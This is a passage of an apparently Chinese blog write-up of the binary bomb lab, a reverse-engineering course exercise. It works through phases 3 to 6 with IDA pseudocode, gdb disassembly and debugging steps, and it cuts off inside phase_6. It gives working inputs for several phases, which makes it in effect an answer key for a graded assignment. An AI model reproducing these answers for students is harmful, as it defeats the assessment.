&lt;+114&gt;:   add    eax,0x3e</span><br><span class="line">   0x00401786 &lt;+117&gt;:   sub    eax,0x3e</span><br><span class="line">   0x00401789 &lt;+120&gt;:   add    eax,0x3e</span><br><span class="line">   0x0040178c &lt;+123&gt;:   sub    eax,0x3e</span><br><span class="line">   0x0040178f &lt;+126&gt;:   cmp    DWORD PTR [ebp-0x14],0x5</span><br><span class="line">   0x00401793 &lt;+130&gt;:   jg     0x40179a &lt;phase_3+137&gt;</span><br><span class="line">   0x00401795 &lt;+132&gt;:   cmp    DWORD PTR [ebp-0x10],eax</span><br><span class="line">   0x00401798 &lt;+135&gt;:   je     0x40179f &lt;phase_3+142&gt;</span><br><span class="line">   0x0040179a &lt;+137&gt;:   call   0x401e64 &lt;explode_bomb&gt;</span><br><span class="line">   0x0040179f &lt;+142&gt;:   mov    eax,DWORD PTR [ebp-0xc]</span><br><span class="line">   0x004017a2 &lt;+145&gt;:   xor    eax,DWORD PTR gs:0x14</span><br><span class="line">   0x004017a9 &lt;+152&gt;:   jne    0x4017ed &lt;phase_3+220&gt;</span><br><span class="line">   0x004017ab &lt;+154&gt;:   mov    ebx,DWORD PTR [ebp-0x4]</span><br><span class="line">   0x004017ae &lt;+157&gt;:   leave</span><br><span class="line">   0x004017af &lt;+158&gt;:   ret</span><br><span class="line">   0x004017b0 &lt;+159&gt;:   mov    eax,0x0</span><br><span class="line">   0x004017b5 &lt;+164&gt;:   jmp    0x401776 &lt;phase_3+101&gt;</span><br><span class="line">   0x004017b7 &lt;+166&gt;:   mov    eax,0x0</span><br><span class="line">   0x004017bc &lt;+171&gt;:   jmp    0x40177b &lt;phase_3+106&gt;</span><br><span class="line">   0x004017be &lt;+173&gt;:   mov    eax,0x0</span><br><span class="line">   0x004017c3 &lt;+178&gt;:   jmp    0x401780 &lt;phase_3+111&gt;</span><br><span class="line">   0x004017c5 &lt;+180&gt;:   mov    eax,0x0</span><br><span class="line">   0x004017ca &lt;+185&gt;:   jmp    0x401783 &lt;phase_3+114&gt;</span><br><span class="line">   0x004017cc &lt;+187&gt;:   mov    eax,0x0</span><br><span class="line">   0x004017d1 &lt;+192&gt;:   jmp    0x401786 &lt;phase_3+117&gt;</span><br><span class="line">   0x004017d3 &lt;+194&gt;:   mov    eax,0x0</span><br><span class="line">   0x004017d8 &lt;+199&gt;:   jmp    0x401789 &lt;phase_3+120&gt;</span><br><span class="line">   0x004017da &lt;+201&gt;:   mov    eax,0x0</span><br><span class="line">   0x004017df &lt;+206&gt;:   jmp    0x40178c &lt;phase_3+123&gt;</span><br><span class="line">   0x004017e1 &lt;+208&gt;:   call   0x401e64 &lt;explode_bomb&gt;</span><br><span class="line">   0x004017e6 &lt;+213&gt;:   mov    eax,0x0</span><br><span class="line">   0x004017eb &lt;+218&gt;:   jmp    0x40178f &lt;phase_3+126&gt;</span><br><span class="line">   0x004017ed &lt;+220&gt;:   call   0x402e00 &lt;__stack_chk_fail_local&gt;</span><br><span class="line">End of assembler dump.</span><br></pre></td></tr></table></figure><h2 id="42-思路"><a class="markdownIt-Anchor" href="#42-思路"></a> 4.2 思路</h2><p>从伪代码看，phase_3需要输入两个整数，第一个整数需要小于等于7，然后跳转到EDX，其他信息无法获取，需要gdb调试。</p><p>假设第一个数为0，进行动态调试：</p><ol><li><p>运行到<code>&lt;+79&gt;</code>，此时EDX=0x401771 (<code>&lt;phase_3+96&gt;: mov eax,0x398</code>)</p></li><li><p><code>&lt;+86&gt;</code>表示跳转到EDX对应的指令地址，也就是<code>&lt;+96&gt;</code></p></li><li><p><code>&lt;+126&gt;</code>和<code>&lt;+130&gt;</code>表示<strong>第一个数还需要小于等于5</strong>：</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">0x0040178f &lt;+126&gt;:   cmp    DWORD PTR [ebp-0x14],0x5</span><br><span class="line">0x00401793 &lt;+130&gt;:   jg     0x40179a &lt;phase_3+137&gt;</span><br></pre></td></tr></table></figure></li><li><p><code>&lt;+132&gt;</code>表示第二个数需要等于EAX，此时的EAX为0x42f：</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">gdb-peda$ p <span class="variable">$eax</span></span><br><span class="line"><span class="variable">$24</span> = 0x42f</span><br><span class="line">gdb-peda$ d <span class="variable">$24</span></span><br><span class="line">No breakpoint number 1071.</span><br></pre></td></tr></table></figure></li><li><p>此时可以得到一组答案<code>0 1071</code>，答案不唯一。</p></li></ol><p><strong>答案</strong>：</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">0 1071</span><br></pre></td></tr></table></figure><h1 id="5-phase_4"><a class="markdownIt-Anchor" href="#5-phase_4"></a> 5 phase_4</h1><h2 id="51-解析"><a class="markdownIt-Anchor" href="#51-解析"></a> 5.1 解析</h2><p>IDA查看phase_4函数伪代码：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> __cdecl <span class="title">func4</span><span class="params">(<span class="keyword">int</span> a1, <span class="keyword">int</span> a2)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">int</span> result; <span class="comment">// eax</span></span><br><span class="line">  <span class="keyword">int</span> v3; <span class="comment">// ebx</span></span><br><span class="line"></span><br><span class="line">  result = <span class="number">0</span>;</span><br><span class="line">  <span class="keyword">if</span> ( a1 &gt; <span class="number">0</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    result = a2;</span><br><span class="line">    <span class="keyword">if</span> ( a1 != <span class="number">1</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      v3 = func4(a1 - <span class="number">1</span>, a2) + a2;</span><br><span class="line">      result = v3 + func4(a1 - <span class="number">2</span>, a2);</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">unsigned</span> <span class="keyword">int</span> __cdecl <span class="title">phase_4</span><span class="params">(<span class="keyword">int</span> a1)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">int</span> v1; <span class="comment">// eax</span></span><br><span class="line">  <span class="keyword">int</span> v3; <span class="comment">// [esp+4h] [ebp-14h] BYREF</span></span><br><span class="line">  <span class="keyword">int</span> v4; <span class="comment">// [esp+8h] [ebp-10h] BYREF</span></span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">int</span> v5; <span class="comment">// [esp+Ch] [ebp-Ch]</span></span><br><span class="line"></span><br><span class="line">  v5 = __readgsdword(<span class="number">0x14</span>u);</span><br><span class="line">  <span class="keyword">if</span> ( __isoc99_sscanf(a1, <span class="string">"%d %d"</span>, &amp;v4, &amp;v3) != <span class="number">2</span> || (<span class="keyword">unsigned</span> <span class="keyword">int</span>)(v3 - <span class="number">2</span>) &gt; <span class="number">2</span> )</span><br><span class="line">    explode_bomb();</span><br><span class="line">  v1 = func4(<span class="number">5</span>, v3);</span><br><span class="line">  <span class="keyword">if</span> ( v4 != v1 )</span><br><span class="line">    explode_bomb();</span><br><span class="line">  <span class="keyword">return</span> __readgsdword(<span class="number">0x14</span>u) ^ v5;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>gdb查看phase_4函数汇编代码：</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br></pre></td><td class="code"><pre><span class="line">gdb-peda$ disassemble phase_4</span><br><span class="line">Dump of assembler code <span class="keyword">for</span> <span class="keyword">function</span> phase_4:</span><br><span class="line">   0x0040183f &lt;+0&gt;:     endbr32</span><br><span class="line">   0x00401843 &lt;+4&gt;:     push   ebp</span><br><span class="line">   0x00401844 &lt;+5&gt;:     mov    ebp,esp</span><br><span class="line">   0x00401846 &lt;+7&gt;:     push   ebx</span><br><span class="line">   0x00401847 &lt;+8&gt;:     sub    esp,0x14</span><br><span class="line">   0x0040184a &lt;+11&gt;:    call   0x4013d0 &lt;__x86.get_pc_thunk.bx&gt;</span><br><span class="line">   0x0040184f &lt;+16&gt;:    add    ebx,0x3715</span><br><span class="line">   0x00401855 &lt;+22&gt;:    mov    eax,gs:0x14</span><br><span class="line">   0x0040185b &lt;+28&gt;:    mov    DWORD PTR [ebp-0xc],eax</span><br><span class="line">   0x0040185e &lt;+31&gt;:    xor    eax,eax</span><br><span class="line">   0x00401860 &lt;+33&gt;:    lea    eax,[ebp-0x14]</span><br><span class="line">   0x00401863 &lt;+36&gt;:    push   eax</span><br><span class="line">   0x00401864 &lt;+37&gt;:    lea    eax,[ebp-0x10]</span><br><span class="line">   0x00401867 &lt;+40&gt;:    push   eax</span><br><span class="line">   0x00401868 &lt;+41&gt;:    lea    eax,[ebx-0x1bb7]</span><br><span class="line">   0x0040186e &lt;+47&gt;:    push   eax</span><br><span class="line">   0x0040186f &lt;+48&gt;:    push   DWORD PTR [ebp+0x8]</span><br><span class="line">   0x00401872 &lt;+51&gt;:    call   0x4012d0 &lt;__isoc99_sscanf@plt&gt;</span><br><span class="line">   0x00401877 &lt;+56&gt;:    add    esp,0x10</span><br><span class="line">   0x0040187a &lt;+59&gt;:    cmp    eax,0x2</span><br><span class="line">   0x0040187d &lt;+62&gt;:    jne    0x40188a &lt;phase_4+75&gt;</span><br><span class="line">   0x0040187f &lt;+64&gt;:    mov    eax,DWORD PTR [ebp-0x14]</span><br><span class="line">   0x00401882 &lt;+67&gt;:    sub    eax,0x2</span><br><span class="line">   0x00401885 &lt;+70&gt;:    cmp    eax,0x2</span><br><span class="line">   0x00401888 &lt;+73&gt;:    jbe    0x40188f &lt;phase_4+80&gt;</span><br><span class="line">   0x0040188a &lt;+75&gt;:    call   0x401e64 &lt;explode_bomb&gt;</span><br><span class="line">   0x0040188f &lt;+80&gt;:    sub    esp,0x8</span><br><span class="line">   0x00401892 &lt;+83&gt;:    push   DWORD PTR [ebp-0x14]</span><br><span class="line">   0x00401895 &lt;+86&gt;:    push   0x5</span><br><span class="line">   0x00401897 &lt;+88&gt;:    call   0x4017f2 &lt;func4&gt;</span><br><span class="line">   0x0040189c &lt;+93&gt;:    add    esp,0x10</span><br><span class="line">   0x0040189f &lt;+96&gt;:    cmp    DWORD PTR [ebp-0x10],eax</span><br><span class="line">   0x004018a2 &lt;+99&gt;:    jne    0x4018b5 &lt;phase_4+118&gt;</span><br><span class="line">   0x004018a4 &lt;+101&gt;:   mov    eax,DWORD PTR [ebp-0xc]</span><br><span class="line">   0x004018a7 &lt;+104&gt;:   xor    eax,DWORD PTR gs:0x14</span><br><span class="line">   0x004018ae &lt;+111&gt;:   jne    0x4018bc &lt;phase_4+125&gt;</span><br><span class="line">   0x004018b0 &lt;+113&gt;:   mov    ebx,DWORD PTR [ebp-0x4]</span><br><span class="line">   0x004018b3 &lt;+116&gt;:   leave</span><br><span class="line">   0x004018b4 &lt;+117&gt;:   ret</span><br><span class="line">   0x004018b5 &lt;+118&gt;:   call   0x401e64 &lt;explode_bomb&gt;</span><br><span class="line">   0x004018ba &lt;+123&gt;:   jmp    0x4018a4 &lt;phase_4+101&gt;</span><br><span class="line">   0x004018bc &lt;+125&gt;:   call   0x402e00 &lt;__stack_chk_fail_local&gt;</span><br><span class="line">End of assembler dump.</span><br></pre></td></tr></table></figure><h2 id="52-思路"><a class="markdownIt-Anchor" href="#52-思路"></a> 5.2 思路</h2><p>从伪代码来看，phase_4需要输入两个整数，第二个可能是2、3、4，第一个需要满足一定的条件。</p><ol><li><p>假设第二个为2，进入gdb动态调试；</p></li><li><p>执行到<code>&lt;+96&gt;</code>，第一个值需要等于此时的EAX，查看EAX的值：</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">gdb-peda$ p <span class="variable">$eax</span></span><br><span class="line"><span class="variable">$28</span> = 0x18</span><br><span class="line">gdb-peda$ d <span class="variable">$28</span></span><br><span class="line">No breakpoint number 24.</span><br></pre></td></tr></table></figure></li><li><p>所以其中一个答案是<code>24 2</code></p></li></ol><p><strong>答案</strong>：</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">24 2</span><br></pre></td></tr></table></figure><h1 id="6-phase_5"><a class="markdownIt-Anchor" href="#6-phase_5"></a> 6 phase_5</h1><h2 id="61-解析"><a class="markdownIt-Anchor" href="#61-解析"></a> 6.1 解析</h2><p>IDA查看phase_5函数伪代码：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">_BYTE *__cdecl <span class="title">phase_5</span><span class="params">(_BYTE *a1)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  _BYTE *result; <span class="comment">// eax</span></span><br><span class="line">  <span class="keyword">int</span> v2; <span class="comment">// ecx</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> ( string_length(a1) != <span class="number">6</span> )</span><br><span class="line">    explode_bomb();</span><br><span class="line">  result = a1;</span><br><span class="line">  v2 = <span class="number">0</span>;</span><br><span class="line">  <span class="keyword">do</span></span><br><span class="line">    v2 += array_3066[*result++ &amp; <span class="number">0xF</span>];</span><br><span class="line">  <span class="keyword">while</span> ( result != a1 + <span class="number">6</span> );</span><br><span class="line">  <span class="keyword">if</span> ( v2 != <span class="number">44</span> )</span><br><span class="line">    explode_bomb();</span><br><span class="line">  <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>gdb查看phase_5函数汇编代码：</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line">gdb-peda$ disassemble phase_5</span><br><span class="line">Dump of assembler code <span class="keyword">for</span> <span class="keyword">function</span> phase_5:</span><br><span class="line">=&gt; 0x004018c1 &lt;+0&gt;:     endbr32</span><br><span class="line">   0x004018c5 &lt;+4&gt;:     push   ebp</span><br><span class="line">   0x004018c6 &lt;+5&gt;:     mov    ebp,esp</span><br><span class="line">   0x004018c8 &lt;+7&gt;:     push   edi</span><br><span class="line">   0x004018c9 &lt;+8&gt;:     push   esi</span><br><span class="line">   0x004018ca &lt;+9&gt;:     push   ebx</span><br><span class="line">   0x004018cb &lt;+10&gt;:    sub    esp,0x18</span><br><span class="line">   0x004018ce &lt;+13&gt;:    call   0x4013d0 &lt;__x86.get_pc_thunk.bx&gt;</span><br><span class="line">   0x004018d3 &lt;+18&gt;:    add    ebx,0x3691</span><br><span class="line">   0x004018d9 &lt;+24&gt;:    mov    esi,DWORD PTR [ebp+0x8]</span><br><span class="line">   0x004018dc &lt;+27&gt;:    push   esi</span><br><span class="line">   0x004018dd &lt;+28&gt;:    call   0x401bb9 &lt;string_length&gt;</span><br><span class="line">   0x004018e2 &lt;+33&gt;:    add    esp,0x10</span><br><span class="line">   0x004018e5 &lt;+36&gt;:    cmp    eax,0x6</span><br><span class="line">   0x004018e8 &lt;+39&gt;:    jne    0x401917 &lt;phase_5+86&gt;</span><br><span class="line">   0x004018ea &lt;+41&gt;:    mov    eax,esi</span><br><span class="line">   0x004018ec &lt;+43&gt;:    add    esi,0x6</span><br><span class="line">   0x004018ef &lt;+46&gt;:    mov    ecx,0x0</span><br><span class="line">   0x004018f4 &lt;+51&gt;:    lea    edi,[ebx-0x1da4]</span><br><span class="line">   0x004018fa &lt;+57&gt;:    movzx  edx,BYTE PTR [eax]</span><br><span class="line">   0x004018fd &lt;+60&gt;:    and    edx,0xf</span><br><span class="line">   0x00401900 &lt;+63&gt;:    add    ecx,DWORD PTR [edi+edx*4]</span><br><span class="line">   0x00401903 &lt;+66&gt;:    add    eax,0x1</span><br><span class="line">   0x00401906 &lt;+69&gt;:    cmp    eax,esi</span><br><span class="line">   0x00401908 &lt;+71&gt;:    jne    0x4018fa &lt;phase_5+57&gt;</span><br><span class="line">   0x0040190a &lt;+73&gt;:    cmp    ecx,0x2c</span><br><span class="line">   0x0040190d &lt;+76&gt;:    jne    0x40191e &lt;phase_5+93&gt;</span><br><span class="line">   0x0040190f &lt;+78&gt;:    lea    esp,[ebp-0xc]</span><br><span class="line">   0x00401912 &lt;+81&gt;:    pop    ebx</span><br><span class="line">   0x00401913 &lt;+82&gt;:    pop    esi</span><br><span class="line">   0x00401914 &lt;+83&gt;:    pop    edi</span><br><span class="line">   0x00401915 &lt;+84&gt;:    pop    ebp</span><br><span class="line">   0x00401916 &lt;+85&gt;:    ret</span><br><span class="line">   0x00401917 &lt;+86&gt;:    call   0x401e64 &lt;explode_bomb&gt;</span><br><span class="line">   0x0040191c &lt;+91&gt;:    jmp    0x4018ea &lt;phase_5+41&gt;</span><br><span class="line">   0x0040191e &lt;+93&gt;:    call   0x401e64 &lt;explode_bomb&gt;</span><br><span class="line">   0x00401923 &lt;+98&gt;:    jmp    0x40190f &lt;phase_5+78&gt;</span><br><span class="line">End of assembler dump.</span><br></pre></td></tr></table></figure><h2 id="62-思路"><a class="markdownIt-Anchor" href="#62-思路"></a> 6.2 思路</h2><p>观察伪代码发现，输入是一段长度为6的字符串，而且需要满足一定的条件。</p><p>在IDA中双击<code>array_3066</code>查看该数组的值：</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">array_3066      dd 2, 0Ah, 6, 1, 0Ch, 10h, 9, 3, 4, 7, 0Eh, 5, 0Bh, 8</span><br></pre></td></tr></table></figure><p>或者在gdb中查看，运行至<code>&lt;+51&gt;</code>：</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">gdb-peda$ x/20x <span class="variable">$ebx</span>-0x1da4</span><br><span class="line">0x4031c0 &lt;array.3066&gt;:  0x00000002      0x0000000a      0x00000006      0x00000001</span><br><span class="line">0x4031d0 &lt;array.3066+16&gt;:       0x0000000c      0x00000010      0x00000009      0x00000003</span><br><span class="line">0x4031e0 &lt;array.3066+32&gt;:       0x00000004      0x00000007      0x0000000e      0x00000005</span><br><span class="line">0x4031f0 &lt;array.3066+48&gt;:       0x0000000b      0x00000008      0x0000000f      0x0000000d</span><br><span class="line">0x403200:       0x79206f53      0x7420756f      0x6b6e6968      0x756f7920</span><br></pre></td></tr></table></figure><p>下标可以这样组合：1 1 1 1 0 0 （也就是10+10+10+10+2+2=44，满足条件）</p><p>对应到字符串是：<code>111100</code> 或 <code>AAAA@@</code>等。</p><p><strong>答案</strong>：</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">111100</span><br></pre></td></tr></table></figure><h1 id="7-phase_6"><a class="markdownIt-Anchor" href="#7-phase_6"></a> 7 phase_6</h1><h2 id="71-解析"><a class="markdownIt-Anchor" href="#71-解析"></a> 7.1 解析</h2><p>IDA查看phase_6函数伪代码：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">unsigned</span> <span class="keyword">int</span> __cdecl <span class="title">phase_6</span><span class="params">(<span class="keyword">int</span> a1)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">int</span> *v1; <span class="comment">// esi</span></span><br><span class="line">  <span class="keyword">int</span> i; <span class="comment">// esi</span></span><br><span class="line">  <span class="keyword">int</span> v3; <span class="comment">// ecx</span></span><br><span class="line">  <span class="keyword">int</span> v4; <span class="comment">// eax</span></span><br><span class="line">  _DWORD *v5; <span class="comment">// edx</span></span><br><span class="line">  <span class="keyword">int</span> v6; <span class="comment">// esi</span></span><br><span class="line">  <span class="keyword">int</span> v7; <span class="comment">// eax</span></span><br><span class="line">  <span class="keyword">int</span> v8; <span class="comment">// edx</span></span><br><span class="line">  <span class="keyword">int</span> v9; <span class="comment">// eax</span></span><br><span class="line">  <span class="keyword">int</span> v10; <span class="comment">// edx</span></span><br><span class="line">  <span class="keyword">int</span> v11; <span class="comment">// eax</span></span><br><span class="line">  <span class="keyword">int</span> v12; <span class="comment">// edi</span></span><br><span class="line">  <span class="keyword">char</span> *v14; <span class="comment">// [esp+Ch] [ebp-64h]</span></span><br><span class="line">  <span class="keyword">int</span> v15; <span class="comment">// [esp+10h] [ebp-60h]</span></span><br><span class="line">  <span class="keyword">int</span> v16; <span class="comment">// [esp+24h] [ebp-4Ch] BYREF</span></span><br><span class="line">  <span class="keyword">char</span> v17; <span class="comment">// [esp+28h] [ebp-48h] BYREF</span></span><br><span class="line">  <span class="keyword">int</span> v18; <span class="comment">// [esp+3Ch] [ebp-34h] BYREF</span></span><br><span class="line">  <span class="keyword">int</span> v19; <span class="comment">// [esp+40h] [ebp-30h]</span></span><br><span class="line">  <span class="keyword">int</span> v20; <span class="comment">// [esp+44h] [ebp-2Ch]</span></span><br><span class="line">  <span class="keyword">int</span> v21; <span class="comment">// [esp+48h] [ebp-28h]</span></span><br><span class="line">  <span class="keyword">int</span> v22; <span class="comment">// [esp+4Ch] [ebp-24h]</span></span><br><span class="line">  <span class="keyword">int</span> v23; <span class="comment">// [esp+50h] [ebp-20h]</span></span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">int</span> v24; <span class="comment">// [esp+54h] [ebp-1Ch]</span></span><br><span class="line"></span><br><span class="line">  v24 = __readgsdword(<span class="number">0x14</span>u);</span><br><span class="line">  read_six_numbers(a1, (<span class="keyword">int</span>)&amp;v16);</span><br><span class="line">  v14 = &amp;v17;</span><br><span class="line">  v15 = <span class="number">0</span>;</span><br><span class="line">  <span class="keyword">while</span> ( <span class="number">1</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">if</span> ( (<span class="keyword">unsigned</span> <span class="keyword">int</span>)(*((_DWORD *)v14 - <span class="number">1</span>) - <span class="number">1</span>) &gt; <span class="number">5</span> )</span><br><span class="line">      explode_bomb();</span><br><span class="line">    <span class="keyword">if</span> ( ++v15 &gt; <span class="number">5</span> )</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">    v1 = (<span class="keyword">int</span> *)v14;</span><br><span class="line">    <span class="keyword">do</span></span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">if</span> ( *((_DWORD *)v14 - <span class="number">1</span>) == *v1 )</span><br><span class="line">        explode_bomb();</span><br><span class="line">      ++v1;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">while</span> ( &amp;v18 != v1 );</span><br><span class="line">    v14 += <span class="number">4</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">for</span> ( i = <span class="number">0</span>; i != <span class="number">6</span>; ++i )</span><br><span class="line">  &#123;</span><br><span class="line">    v3 = *(&amp;v16 + i);</span><br><span class="line">    v4 = <span class="number">1</span>;</span><br><span class="line">    v5 = &amp;node1;</span><br><span class="line">    <span class="keyword">if</span> ( v3 &gt; <span class="number">1</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">do</span></span><br><span class="line">      &#123;</span><br><span class="line">        v5 = (_DWORD *)v5[<span class="number">2</span>];</span><br><span class="line">        ++v4;</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="keyword">while</span> ( v4 != v3 );</span><br><span class="line">    &#125;</span><br><span class="line">    *(&amp;v18 + i) = (<span class="keyword">int</span>)v5;</span><br><span class="line">  &#125;</span><br><span class="line">  v6 = v18;</span><br><span class="line">  v7 = v19;</span><br><span class="line">  *(_DWORD *)(v18 + <span class="number">8</span>) = v19;</span><br><span class="line">  v8 = v20;</span><br><span class="line">  *(_DWORD *)(v7 + <span class="number">8</span>) = v20;</span><br><span class="line">  v9 = v21;</span><br><span class="line">  *(_DWORD *)(v8 + <span class="number">8</span>) = v21;</span><br><span class="line">  v10 = v22;</span><br><span class="line">  *(_DWORD *)(v9 + <span class="number">8</span>) = v22;</span><br><span class="line">  v11 = v23;</span><br><span class="line">  *(_DWORD *)(v10 + <span class="number">8</span>) = v23;</span><br><span class="line">  *(_DWORD *)(v11 + <span class="number">8</span>) = <span class="number">0</span>;</span><br><span class="line">  v12 = <span class="number">5</span>;</span><br><span class="line">  <span class="keyword">do</span></span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">if</span> ( *(_DWORD *)v6 &gt; **(_DWORD **)(v6 + <span class="number">8</span>) )</span><br><span class="line">      explode_bomb();</span><br><span class="line">    v6 = *(_DWORD *)(v6 + <span class="number">8</span>);</span><br><span class="line">    --v12;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">while</span> ( v12 );</span><br><span class="line">  <span class="keyword">return</span> __readgsdword(<span class="number">0x14</span>u) ^ v24;</span><br><span 